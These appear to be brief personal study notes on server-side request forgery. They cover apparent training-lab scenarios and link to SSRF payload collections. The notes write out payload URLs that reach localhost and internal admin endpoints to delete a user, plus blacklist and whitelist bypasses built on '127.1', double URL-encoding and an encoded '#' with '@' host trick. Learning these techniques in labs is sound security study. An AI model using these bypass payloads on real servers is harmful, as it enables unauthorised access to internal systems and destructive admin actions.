URLS 


https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md

https://infosecwriteups.com/exploiting-non-cloud-ssrf-for-more-fun-profit-3597934518c8 

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md?source=post_page-----ff129a5faac--------------------------------

https://github.com/cujanovic/SSRF-Testing?source=post_page-----ff129a5faac--------------------------------

https://github.com/jdonsec/AllThingsSSRF?tab=readme-ov-file


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////


SSRF
SSRF against the local server
*When we see url in intercept look for SSRF attack (use control + u for encode ) and send request
*if you get url replace with localhost  http://localhost/admin  & check always raw response

SSRF against another back-end system
* When we see url in intercept look for SSRF attack (use control + u for encode ) and send request
*sometime we get  ip address in this links try to change endpoint & check response. Alternatively try to bypass admin example http://192.168.0.48:8080/admin/delete?username=carlos

SSRF with blacklist-based input filter
*try to use 127.1  or convert to binary (127.0.0.1) , Ather try to convet to uRl or we can say decode admin two times using a character (encode all character) http://127.1/%25%36%31dmin/delete?username=carlos 

SSRF with whitelist-based input filter
*for whitelist always use url (stock.weliketoshop.net). after that use # & encode two times , the url looks like http://localhost%2523@stock.weliketoshop.net ,  
*http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos  this delete carlos account
